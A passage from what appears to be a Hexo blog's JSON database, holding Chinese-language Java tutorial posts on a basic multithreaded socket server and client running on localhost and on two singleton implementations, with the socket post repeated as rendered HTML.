//通过socket输入流，读取客户端发来的数据\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                //通过socket输出流，给客户端发送回执\n                out = new PrintWriter(socket.getOutputStream(), true);\n\n                //获取input\n                String line = \"\";\n               // line = in.readLine(); //其实就只有一行数据\n               while (true){\n                   if(in.ready()){\n                       line = in.readLine();\n                       System.out.println(line);\n                       break;\n                   }\n               }\n                socket.shutdownInput();\n\n               //返回\n                String result = vaildCkeck(line);\n                out.write(result);\n\n                //关闭socket\n                out.flush();\n                in.close();\n                out.close();\n                logger.info(\"该子socket监听完成，并关闭\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                //\n            }\n        }\n    }\n\n    /**\n     * 输入校验，返回定义错误类型\n     * @param line\n     * @return\n     */\n    public String vaildCkeck(String line) {\n      //.....\n        }\n    }\n}\n\n```\n\nclient代码，创建三个socket连接\n```\n\npublic class MsgTest {\n\n  public void send() throws Exception,SGIP_Exception {\n      //简单创建三个连接\n      Thread t1 = new SocketClientThread();\n      Thread t2 = new SocketClientThread();\n      Thread t3 = new SocketClientThread();\n      t1.join();\n      t2.join();\n      t3.join();\n      t1.start();\n      t2.start();\n      t3.start();\n  }\n\n  //socket\n  class SocketClientThread extends  Thread{\n      @Override\n      public void run(){\n          Socket socket = null;\n          BufferedReader in = null;\n          PrintWriter out = null;\n\n          //可以同时发送1-100个号码\n          String str1 = \"178888******,178888******\";\n          String str2 = \"191\";\n          String str3 = \"内容1111111111111111111111111111111111\";\n          String str = str1 +\"|\" + str2 + \"|\" + str3;\n\n          //建立连接\n          try {\n              socket = new Socket(\"127.0.0.1\", 8888);\n              socket.setSoTimeout(10000);\n              System.out.println(\"socket connected!\");\n              out = new PrintWriter(socket.getOutputStream());\n              in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n              //发送消息\n              out.write(str);\n              out.flush();\n              socket.shutdownOutput();\n              //得到回执\n              System.out.println(in.readLine());\n              //关闭连接\n              in.close();\n              out.close();\n              socket.close();\n          }catch (Exception e){\n              e.printStackTrace();\n          }\n      }\n  }\n\n}\n\n```\n运行截图\n\n![client](../images/socketclient.png)\n\n![server](../images/socketserver.png)\n\n#### 2.nio\n\n#### 3.netty\n","source":"_posts/java/javasocket.md","raw":"---\ntitle: javasocket\ndate: 2018-09-26 17:49:23\ntags: [java]\n---\n\n#### 1.java.net.socket\nserver端代码，使用子线程处理连接\n```\n@Controller\npublic class SocketController {\n    private final static Log logger = LogFactory.getLog(SocketController.class);\n\n    public void accept(){\n        try{\n            ServerSocket socketServer = new ServerSocket(8888);\n            logger.info(\"socket启动，保持监听。。。\");\n            //保持监听,同时连接多个\n            while (true){\n                Socket socket = socketServer.accept();\n                logger.info(\"子socket开始.....\");\n                new DispatchRequestThread(socket).start();\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 处理socket线程类\n     */\n    class DispatchRequestThread extends Thread {\n\n        BufferedReader in;\n        PrintWriter out;\n        Socket socket;\n\n        public DispatchRequestThread(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                //通过socket输入流，读取客户端发来的数据\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                //通过socket输出流，给客户端发送回执\n                out = new PrintWriter(socket.getOutputStream(), true);\n\n                //获取input\n                String line = \"\";\n               // line = in.readLine(); //其实就只有一行数据\n               while (true){\n                   if(in.ready()){\n                       line = in.readLine();\n                       System.out.println(line);\n                       break;\n                   }\n               }\n                socket.shutdownInput();\n\n               //返回\n                String result = vaildCkeck(line);\n                out.write(result);\n\n                //关闭socket\n                out.flush();\n                in.close();\n                out.close();\n                logger.info(\"该子socket监听完成，并关闭\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                //\n            }\n        }\n    }\n\n    /**\n     * 输入校验，返回定义错误类型\n     * @param line\n     * @return\n     */\n    public String vaildCkeck(String line) {\n      //.....\n        }\n    }\n}\n\n```\n\nclient代码，创建三个socket连接\n```\n\npublic class MsgTest {\n\n  public void send() throws Exception,SGIP_Exception {\n      //简单创建三个连接\n      Thread t1 = new SocketClientThread();\n      Thread t2 = new SocketClientThread();\n      Thread t3 = new SocketClientThread();\n      t1.join();\n      t2.join();\n      t3.join();\n      t1.start();\n      t2.start();\n      t3.start();\n  }\n\n  //socket\n  class SocketClientThread extends  Thread{\n      @Override\n      public void run(){\n          Socket socket = null;\n          BufferedReader in = null;\n          PrintWriter out = null;\n\n          //可以同时发送1-100个号码\n          String str1 = \"178888******,178888******\";\n          String str2 = \"191\";\n          String str3 = \"内容1111111111111111111111111111111111\";\n          String str = str1 +\"|\" + str2 + \"|\" + str3;\n\n          //建立连接\n          try {\n              socket = new Socket(\"127.0.0.1\", 8888);\n              socket.setSoTimeout(10000);\n              System.out.println(\"socket connected!\");\n              out = new PrintWriter(socket.getOutputStream());\n              in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n              //发送消息\n              out.write(str);\n              out.flush();\n              socket.shutdownOutput();\n              //得到回执\n              System.out.println(in.readLine());\n              //关闭连接\n              in.close();\n              out.close();\n              socket.close();\n          }catch (Exception e){\n              e.printStackTrace();\n          }\n      }\n  }\n\n}\n\n```\n运行截图\n\n![client](../images/socketclient.png)\n\n![server](../images/socketserver.png)\n\n#### 2.nio\n\n#### 3.netty\n","slug":"java/javasocket","published":1,"updated":"2019-01-21T09:06:25.245Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051i000s6cvpo61fq66y","content":"<h4 id=\"1-java-net-socket\"><a href=\"#1-java-net-socket\" class=\"headerlink\" title=\"1.java.net.socket\"></a>1.java.net.socket</h4><p>server端代码，使用子线程处理连接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class SocketController &#123;</span><br><span class=\"line\">    private final static Log logger = LogFactory.getLog(SocketController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    public void accept()&#123;</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            ServerSocket socketServer = new ServerSocket(8888);</span><br><span class=\"line\">            logger.info(&quot;socket启动，保持监听。。。&quot;);</span><br><span class=\"line\">            //保持监听,同时连接多个</span><br><span class=\"line\">            while (true)&#123;</span><br><span class=\"line\">                Socket socket = socketServer.accept();</span><br><span class=\"line\">                logger.info(&quot;子socket开始.....&quot;);</span><br><span class=\"line\">                new DispatchRequestThread(socket).start();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 处理socket线程类</span><br><span class=\"line\">     */</span><br><span class=\"line\">    class DispatchRequestThread extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        BufferedReader in;</span><br><span class=\"line\">        PrintWriter out;</span><br><span class=\"line\">        Socket socket;</span><br><span class=\"line\"></span><br><span class=\"line\">        public DispatchRequestThread(Socket socket) &#123;</span><br><span class=\"line\">            this.socket = socket;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                //通过socket输入流，读取客户端发来的数据</span><br><span class=\"line\">                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">                //通过socket输出流，给客户端发送回执</span><br><span class=\"line\">                out = new PrintWriter(socket.getOutputStream(), true);</span><br><span class=\"line\"></span><br><span class=\"line\">                //获取input</span><br><span class=\"line\">                String line = &quot;&quot;;</span><br><span class=\"line\">               // line = in.readLine(); //其实就只有一行数据</span><br><span class=\"line\">               while (true)&#123;</span><br><span class=\"line\">                   if(in.ready())&#123;</span><br><span class=\"line\">                       line = in.readLine();</span><br><span class=\"line\">                       System.out.println(line);</span><br><span class=\"line\">                       break;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">                socket.shutdownInput();</span><br><span class=\"line\"></span><br><span class=\"line\">               //返回</span><br><span class=\"line\">                String result = vaildCkeck(line);</span><br><span class=\"line\">                out.write(result);</span><br><span class=\"line\"></span><br><span class=\"line\">                //关闭socket</span><br><span class=\"line\">                out.flush();</span><br><span class=\"line\">                in.close();</span><br><span class=\"line\">                out.close();</span><br><span class=\"line\">                logger.info(&quot;该子socket监听完成，并关闭&quot;);</span><br><span class=\"line\">            &#125; catch (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; finally &#123;</span><br><span class=\"line\">                //</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 输入校验，返回定义错误类型</span><br><span class=\"line\">     * @param line</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String vaildCkeck(String line) &#123;</span><br><span class=\"line\">      //.....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>client代码，创建三个socket连接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">public class MsgTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void send() throws Exception,SGIP_Exception &#123;</span><br><span class=\"line\">      //简单创建三个连接</span><br><span class=\"line\">      Thread t1 = new SocketClientThread();</span><br><span class=\"line\">      Thread t2 = new SocketClientThread();</span><br><span class=\"line\">      Thread t3 = new SocketClientThread();</span><br><span class=\"line\">      t1.join();</span><br><span class=\"line\">      t2.join();</span><br><span class=\"line\">      t3.join();</span><br><span class=\"line\">      t1.start();</span><br><span class=\"line\">      t2.start();</span><br><span class=\"line\">      t3.start();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //socket</span><br><span class=\"line\">  class SocketClientThread extends  Thread&#123;</span><br><span class=\"line\">      @Override</span><br><span class=\"line\">      public void run()&#123;</span><br><span class=\"line\">          Socket socket = null;</span><br><span class=\"line\">          BufferedReader in = null;</span><br><span class=\"line\">          PrintWriter out = null;</span><br><span class=\"line\"></span><br><span class=\"line\">          //可以同时发送1-100个号码</span><br><span class=\"line\">          String str1 = &quot;178888******,178888******&quot;;</span><br><span class=\"line\">          String str2 = &quot;191&quot;;</span><br><span class=\"line\">          String str3 = &quot;内容1111111111111111111111111111111111&quot;;</span><br><span class=\"line\">          String str = str1 +&quot;|&quot; + str2 + &quot;|&quot; + str3;</span><br><span class=\"line\"></span><br><span class=\"line\">          //建立连接</span><br><span class=\"line\">          try &#123;</span><br><span class=\"line\">              socket = new Socket(&quot;127.0.0.1&quot;, 8888);</span><br><span class=\"line\">              socket.setSoTimeout(10000);</span><br><span class=\"line\">              System.out.println(&quot;socket connected!&quot;);</span><br><span class=\"line\">              out = new PrintWriter(socket.getOutputStream());</span><br><span class=\"line\">              in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">              //发送消息</span><br><span class=\"line\">              out.write(str);</span><br><span class=\"line\">              out.flush();</span><br><span class=\"line\">              socket.shutdownOutput();</span><br><span class=\"line\">              //得到回执</span><br><span class=\"line\">              System.out.println(in.readLine());</span><br><span class=\"line\">              //关闭连接</span><br><span class=\"line\">              in.close();</span><br><span class=\"line\">              out.close();</span><br><span class=\"line\">              socket.close();</span><br><span class=\"line\">          &#125;catch (Exception e)&#123;</span><br><span class=\"line\">              e.printStackTrace();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>运行截图</p>\n<p><img src=\"../images/socketclient.png\" alt=\"client\"></p>\n<p><img src=\"../images/socketserver.png\" alt=\"server\"></p>\n<h4 id=\"2-nio\"><a href=\"#2-nio\" class=\"headerlink\" title=\"2.nio\"></a>2.nio</h4><h4 id=\"3-netty\"><a href=\"#3-netty\" class=\"headerlink\" title=\"3.netty\"></a>3.netty</h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-java-net-socket\"><a href=\"#1-java-net-socket\" class=\"headerlink\" title=\"1.java.net.socket\"></a>1.java.net.socket</h4><p>server端代码，使用子线程处理连接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class SocketController &#123;</span><br><span class=\"line\">    private final static Log logger = LogFactory.getLog(SocketController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    public void accept()&#123;</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            ServerSocket socketServer = new ServerSocket(8888);</span><br><span class=\"line\">            logger.info(&quot;socket启动，保持监听。。。&quot;);</span><br><span class=\"line\">            //保持监听,同时连接多个</span><br><span class=\"line\">            while (true)&#123;</span><br><span class=\"line\">                Socket socket = socketServer.accept();</span><br><span class=\"line\">                logger.info(&quot;子socket开始.....&quot;);</span><br><span class=\"line\">                new DispatchRequestThread(socket).start();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 处理socket线程类</span><br><span class=\"line\">     */</span><br><span class=\"line\">    class DispatchRequestThread extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        BufferedReader in;</span><br><span class=\"line\">        PrintWriter out;</span><br><span class=\"line\">        Socket socket;</span><br><span class=\"line\"></span><br><span class=\"line\">        public DispatchRequestThread(Socket socket) &#123;</span><br><span class=\"line\">            this.socket = socket;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                //通过socket输入流，读取客户端发来的数据</span><br><span class=\"line\">                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">                //通过socket输出流，给客户端发送回执</span><br><span class=\"line\">                out = new PrintWriter(socket.getOutputStream(), true);</span><br><span class=\"line\"></span><br><span class=\"line\">                //获取input</span><br><span class=\"line\">                String line = &quot;&quot;;</span><br><span class=\"line\">               // line = in.readLine(); //其实就只有一行数据</span><br><span class=\"line\">               while (true)&#123;</span><br><span class=\"line\">                   if(in.ready())&#123;</span><br><span class=\"line\">                       line = in.readLine();</span><br><span class=\"line\">                       System.out.println(line);</span><br><span class=\"line\">                       break;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">                socket.shutdownInput();</span><br><span class=\"line\"></span><br><span class=\"line\">               //返回</span><br><span class=\"line\">                String result = vaildCkeck(line);</span><br><span class=\"line\">                out.write(result);</span><br><span class=\"line\"></span><br><span class=\"line\">                //关闭socket</span><br><span class=\"line\">                out.flush();</span><br><span class=\"line\">                in.close();</span><br><span class=\"line\">                out.close();</span><br><span class=\"line\">                logger.info(&quot;该子socket监听完成，并关闭&quot;);</span><br><span class=\"line\">            &#125; catch (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; finally &#123;</span><br><span class=\"line\">                //</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 输入校验，返回定义错误类型</span><br><span class=\"line\">     * @param line</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String vaildCkeck(String line) &#123;</span><br><span class=\"line\">      //.....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>client代码，创建三个socket连接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">public class MsgTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void send() throws Exception,SGIP_Exception &#123;</span><br><span class=\"line\">      //简单创建三个连接</span><br><span class=\"line\">      Thread t1 = new SocketClientThread();</span><br><span class=\"line\">      Thread t2 = new SocketClientThread();</span><br><span class=\"line\">      Thread t3 = new SocketClientThread();</span><br><span class=\"line\">      t1.join();</span><br><span class=\"line\">      t2.join();</span><br><span class=\"line\">      t3.join();</span><br><span class=\"line\">      t1.start();</span><br><span class=\"line\">      t2.start();</span><br><span class=\"line\">      t3.start();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //socket</span><br><span class=\"line\">  class SocketClientThread extends  Thread&#123;</span><br><span class=\"line\">      @Override</span><br><span class=\"line\">      public void run()&#123;</span><br><span class=\"line\">          Socket socket = null;</span><br><span class=\"line\">          BufferedReader in = null;</span><br><span class=\"line\">          PrintWriter out = null;</span><br><span class=\"line\"></span><br><span class=\"line\">          //可以同时发送1-100个号码</span><br><span class=\"line\">          String str1 = &quot;178888******,178888******&quot;;</span><br><span class=\"line\">          String str2 = &quot;191&quot;;</span><br><span class=\"line\">          String str3 = &quot;内容1111111111111111111111111111111111&quot;;</span><br><span class=\"line\">          String str = str1 +&quot;|&quot; + str2 + &quot;|&quot; + str3;</span><br><span class=\"line\"></span><br><span class=\"line\">          //建立连接</span><br><span class=\"line\">          try &#123;</span><br><span class=\"line\">              socket = new Socket(&quot;127.0.0.1&quot;, 8888);</span><br><span class=\"line\">              socket.setSoTimeout(10000);</span><br><span class=\"line\">              System.out.println(&quot;socket connected!&quot;);</span><br><span class=\"line\">              out = new PrintWriter(socket.getOutputStream());</span><br><span class=\"line\">              in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">              //发送消息</span><br><span class=\"line\">              out.write(str);</span><br><span class=\"line\">              out.flush();</span><br><span class=\"line\">              socket.shutdownOutput();</span><br><span class=\"line\">              //得到回执</span><br><span class=\"line\">              System.out.println(in.readLine());</span><br><span class=\"line\">              //关闭连接</span><br><span class=\"line\">              in.close();</span><br><span class=\"line\">              out.close();</span><br><span class=\"line\">              socket.close();</span><br><span class=\"line\">          &#125;catch (Exception e)&#123;</span><br><span class=\"line\">              e.printStackTrace();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>运行截图</p>\n<p><img src=\"../images/socketclient.png\" alt=\"client\"></p>\n<p><img src=\"../images/socketserver.png\" alt=\"server\"></p>\n<h4 id=\"2-nio\"><a href=\"#2-nio\" class=\"headerlink\" title=\"2.nio\"></a>2.nio</h4><h4 id=\"3-netty\"><a href=\"#3-netty\" class=\"headerlink\" title=\"3.netty\"></a>3.netty</h4>"},{"title":"java单例","date":"2018-10-31T08:43:55.000Z","_content":"\n#### 1.用途\n用来维护一个全局的类，保存某些常用数据，减少资源消耗。\n#### 2.原理\n维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。\n\n#### 3.两种常用实现\n1.饿汉式\n```\npublic class Singleton {\n    //这句饿汉式的关键，类加载时初始化\n    private static  final Singleton instance = new Singleton();\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n```\n\n2.静态内部类\n可用调用时再初始化加载(lazyLoad)\n```\npublic class Singleton {\n    //静态内部类\n    private static class SingletonHolder{\n        private static  final Singleton instance = new Singleton();\n    }\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return SingletonHolder.instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n\n```\n","source":"_posts/java/java单例.md","raw":"---\ntitle: java单例\ndate: 2018-10-31 16:43:55\ntags: [java]\n---\n\n#### 1.用途\n用来维护一个全局的类，保存某些常用数据，减少资源消耗。\n#### 2.原理\n维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。\n\n#### 3.两种常用实现\n1.饿汉式\n```\npublic class Singleton {\n    //这句饿汉式的关键，类加载时初始化\n    private static  final Singleton instance = new Singleton();\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n```\n\n2.静态内部类\n可用调用时再初始化加载(lazyLoad)\n```\npublic class Singleton {\n    //静态内部类\n    private static class SingletonHolder{\n        private static  final Singleton instance = new Singleton();\n    }\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return SingletonHolder.instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    